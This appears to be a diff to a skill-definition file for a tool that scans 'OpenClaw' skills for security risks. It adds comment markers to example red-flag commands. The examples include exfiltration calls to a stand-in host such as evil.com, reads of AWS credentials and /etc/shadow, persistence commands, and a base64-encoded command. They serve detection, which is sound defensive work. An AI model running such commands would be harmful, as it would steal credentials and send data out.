@@ -1,7 +1,7 @@
 ---
 name: skill-security-scanner
 description: Scan OpenClaw skills for security issues, suspicious permissions, and trust scoring. Use when: (1) Installing a new skill, (2) Auditing existing skills, (3) User asks if a skill is safe, (4) Before running untrusted skills.
-metadata: {"openclaw":{"emoji":"🔍","always":true}}
+metadata: {"openclaw":{"emoji":"🔍"}}
 ---
 
 # Skill Security Scanner
@@ -135,28 +135,28 @@ Generate a full report:
 
 1. **Network exfiltration**
    ```bash
-   # Sending data to unknown servers
-   curl -X POST https://evil.com/exfil
-   fetch("https://data-collector.io")
+   # Example: sending data to unknown servers
+   # curl -X POST https://SUSPICIOUS-DOMAIN/exfil
+   # fetch("https://data-collector.DOMAIN")
    ```
 
 2. **Credential harvesting**
    ```bash
-   # Reading credentials
-   cat ~/.aws/credentials
-   grep "password" /etc/shadow
+   # Example: reading credentials
+   # cat ~/.aws/credentials
+   # grep "password" /etc/shadow
    ```
 
 3. **Persistence mechanisms**
    ```bash
-   # Auto-start, cron, systemd
-   sudo crontab -l
-   systemctl enable
+   # Example: auto-start, cron, systemd
+   # sudo crontab -l
+   # systemctl enable
    ```
 
 4. **Obfuscated code**
    ```bash
-   # Base64 encoded commands
+   # Example: base64 encoded commands
    echo "c3VkbyByb20gL3J0ZiAv" | base64 -d
    ```
 
